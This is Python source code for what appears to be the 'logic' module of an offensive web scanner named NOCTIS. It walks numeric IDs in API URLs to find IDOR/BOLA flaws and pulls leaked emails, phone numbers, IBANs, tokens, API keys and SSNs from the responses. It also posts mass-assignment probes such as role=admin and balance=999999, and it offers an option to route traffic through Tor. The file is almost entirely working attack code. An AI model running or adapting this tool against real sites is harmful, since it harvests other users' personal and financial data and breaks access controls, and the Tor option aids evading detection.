#!/usr/bin/env python3
"""
NOCTIS module — business logic flaws: IDOR, BOLA, mass assignment,
forced browsing on numeric identifiers.

  noctis logic <url_with_id>          e.g. https://site/api/user/5
  noctis logic <url> -k id            parameter key to mutate
  noctis logic <url> -r 1-10          range to test
"""
import json
import re
import sys

sys.dont_write_bytecode = True
import os
BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE)
from core.session import Session

NAME = "logic"
ALIASES = ["lg"]
HELP = "business logic flaws (IDOR/BOLA)"
PREFIX = "logic"

C = {"r": "\033[0m", "b": "\033[1m", "d": "\033[2m", "red": "\033[31m",
     "g": "\033[32m", "y": "\033[33m", "c": "\033[36m", "m": "\033[35m"}

SENSITIVE = ["email", "phone", "address", "password", "token", "secret",
             "balance", "credit", "iban", "passport", "national", "ssn",
             "role", "admin", "is_admin", "user_id", "owner"]

def hdr(t):
    print(f"\n{C['m']}{C['b']}┌─ {t} {'─' * max(0, 44 - len(t))}{C['r']}")

def out(k, v):
    print(f"  {C['c']}{k:<18}{C['r']} {v}")

def parse_range(s):
    if "-" in s:
        a, b = s.split("-", 1)
        try:
            return list(range(int(a), int(b) + 1))
        except ValueError:
            return []
    return [int(x) for x in s.split(",") if x.strip().isdigit()]

def extract_id(url):
    """Find a trailing numeric id and return (template, original)."""
    m = re.search(r"/(\d+)(?:[/?#]|$)", url)
    if m:
        return url.replace(f"/{m.group(1)}", "/{ID}", 1), int(m.group(1))
    m = re.search(r"([?&][A-Za-z_]+=)(\d+)", url)
    if m:
        return url.replace(m.group(2), "{ID}", 1), int(m.group(2))
    return None, None


PROSE_TAGS = ("p", "h1", "h2", "h3", "h4", "span", "li", "blockquote", "em")

def _strip_prose(html):
    """Remove descriptive text so only structured data remains."""
    for tag in PROSE_TAGS:
        html = re.sub(rf"<{tag}[^>]*>.*?</{tag}>", " ", html, flags=re.I | re.S)
    # keep only script/json blocks and form inputs
    keep = []
    for m in re.finditer(r"<script[^>]*>(.*?)</script>", html, re.I | re.S):
        keep.append(m.group(1))
    for m in re.finditer(r"<input[^>]+>", html, re.I):
        keep.append(m.group(0))
    for m in re.finditer(r"<form[^>]*>(.*?)</form>", html, re.I | re.S):
        keep.append(m.group(1))
    return " ".join(keep)


IDENTITY_PATTERNS = [
    (r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "email"),
    (r"\b\+?\d{10,15}\b", "phone"),
    (r"\b[A-Z]{2}\d{2}[A-Z0-9]{10,30}\b", "iban"),
    (r'"user_?name"\s*:\s*"([^"]{2,40})"', "username"),
    (r'"first_?name"\s*:\s*"([^"]{2,40})"', "firstname"),
    (r'"address"\s*:\s*"([^"]{5,80})"', "address"),
    (r'"api_?key"\s*:\s*"([^"]{8,80})"', "apikey"),
    (r'"token"\s*:\s*"([^"]{10,120})"', "token"),
    (r'"ssn"\s*:\s*"([^"]{5,20})"', "ssn"),
]

def identity_signals(html):
    """Return actual identity values found in structured data."""
    blob = _strip_prose(html)
    found = []
    for pat, label in IDENTITY_PATTERNS:
        m = re.search(pat, blob)
        if m:
            val = m.group(1) if m.groups() else m.group(0)
            found.append(f"{label}={val[:30]}")
    return sorted(set(found))

def structured_signals(html):
    """Return sensitive keys that appear with an actual value, in JSON/inputs."""
    blob = _strip_prose(html)
    hits = []
    for key in SENSITIVE:
        # json style  "email":"x@y"
        if re.search(rf'"{key}"\s*:\s*("[^"]+"|\d+|true|false)', blob, re.I):
            hits.append(key)
            continue
        # value look-alikes: email pattern, phone, iban
        if key == "email" and re.search(r"[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}", blob, re.I):
            hits.append("email-value")
            continue
        if key == "phone" and re.search(r"\+?\d{9,15}", blob):
            hits.append("phone-value")
            continue
        if key == "iban" and re.search(r"\b[A-Z]{2}\d{2}[A-Z0-9]{10,30}\b", blob):
            hits.append("iban-value")
            continue
    return sorted(set(hits))

def numeric_idor(sess, url, ids):
    """Compare responses across ids; flag size/content divergence."""
    template, original = extract_id(url)
    if not template:
        return []
    base_st, base_h, base_b, _ = sess.get(url)
    if base_st is None:
        return []
    base_len = len(base_b)
    base_text = base_b.decode("utf-8", "ignore")

    findings = []
    for i in ids:
        if i == original:
            continue
        test = template.replace("{ID}", str(i))
        st, h, b, fin = sess.get(test)
        if st is None:
            continue
        size = len(b)
        text = b.decode("utf-8", "ignore")
        same_page = abs(size - base_len) < 40
        if st == 200 and not same_page and size > 200:
            leaked = identity_signals(text)
            sev = "high" if leaked else "info"
            # IDOR requires an identity signal, not just different bytes
            if not leaked:
                continue
            findings.append({
                "id": i, "url": fin, "status": st, "size": size,
                "delta": size - base_len, "signals": leaked, "severity": sev,
            })
            color = C["red"] if leaked else C["y"]
            print(f"  {color}{st}{C['r']} id={i:<6} {size}b "
                  f"({'+' if size>base_len else ''}{size-base_len}) "
                  f"{C['d']}{', '.join(leaked) or 'different content'}{C['r']}")
    return findings

def mass_assignment(sess, url):
    """Try adding privileged fields to a JSON endpoint."""
    results = []
    probes = [
        {"role": "admin"}, {"is_admin": True}, {"admin": 1},
        {"verified": True}, {"balance": 999999},
    ]
    for probe in probes:
        st, h, b, fin = sess.post(url, json=probe)
        if st is None:
            continue
        text = b.decode("utf-8", "ignore")
        accepted = st in (200, 201) and '"error"' not in text.lower()
        if accepted:
            results.append({"probe": probe, "status": st, "size": len(b)})
            print(f"  {C['y']}{st}{C['r']} {json.dumps(probe)} "
                  f"{C['d']}accepted?{C['r']}")
    return results

def main_run(a):
    base = a.target
    if not base.startswith("http"):
        base = "https://" + base
    sess = Session(tor=a.tor, retries=1, delay=0.4)
    print(f"{C['b']}{C['red']}NOCTIS{C['r']} {C['d']}// logic // {base}{C['r']}")

    ids = parse_range(a.range) if a.range else [1, 2, 3, 0, 999]

    hdr("BASELINE")
    st, h, b, fin = sess.get(base)
    out("status", st if st else "unreachable")
    out("size", f"{len(b)}b")
    if st is None:
        return {"url": base, "error": "unreachable"}

    hdr("IDOR / BOLA")
    findings = numeric_idor(sess, base, ids)
    if not findings:
        print(f"  {C['d']}no divergence across ids{C['r']}")

    hdr("MASS ASSIGNMENT")
    ma = mass_assignment(sess, base)
    if not ma:
        print(f"  {C['d']}no privileged field accepted{C['r']}")

    hdr("SUMMARY")
    out("idor findings", len(findings))
    out("mass assignment", len(ma))
    out("highest severity",
        "high" if any(f["severity"] == "high" for f in findings) else
        "medium" if findings else "none")
    return {"url": base, "idor": findings, "mass_assignment": ma}

def add_args(p):
    p.add_argument("target")
    p.add_argument("-r", "--range", help="")
    p.add_argument("-k", "--key", help="")
    p.add_argument("-t", "--tor", action="store_true")

def execute(a):
    return main_run(a)

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    add_args(ap)
    execute(ap.parse_args())
